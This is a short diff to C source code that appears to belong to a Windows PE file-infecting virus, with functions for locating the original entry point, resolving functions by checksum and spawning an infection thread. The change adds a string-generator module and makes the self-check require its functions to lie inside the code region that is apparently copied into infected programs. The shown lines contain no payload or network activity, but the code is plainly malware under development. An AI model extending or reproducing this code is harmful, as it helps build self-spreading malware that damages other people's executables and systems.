@@ -11,6 +11,7 @@
 #include "oep.h"
 #include "pe.h"
 #include "process_info.h"
+#include "string_generator.h"
 #include "utility.h"
 
 #ifdef _WIN64
@@ -33,8 +34,7 @@ int main(int argc, char **argv) {
     PRINT_DEBUG("bit_width: %d", IS_32_BIT ? 32 : IS_64_BIT ? 64 : 0);
     PRINT_DEBUG("code_begin: 0x%p", code_begin);
     PRINT_DEBUG("code_end: 0x%p", code_end);
-    PRINT_DEBUG("code_size: %.2fkiB",
-                (float)CODE_SIZE / 1024.);
+    PRINT_DEBUG("code_size: %.2fkiB", (float)CODE_SIZE / 1024.);
     uint8_t sane_function_locations = check_functions();
     PRINT_DEBUG("sane function locations: %s",
                 sane_function_locations ? "yes" : "no");
@@ -50,6 +50,7 @@ int main(int argc, char **argv) {
 
 static uint8_t check_functions(void) {
     return !IN_BOUNDARIES(main) && !IN_BOUNDARIES(check_functions) &&
+           IN_BOUNDARIES(get_string) && IN_BOUNDARIES(get_string_length) &&
            IN_BOUNDARIES(checksum) && IN_BOUNDARIES(fill_function_list) &&
            IN_BOUNDARIES(get_data) && IN_BOUNDARIES(get_function_by_checksum) &&
            IN_BOUNDARIES(spawn_infection_thread) &&
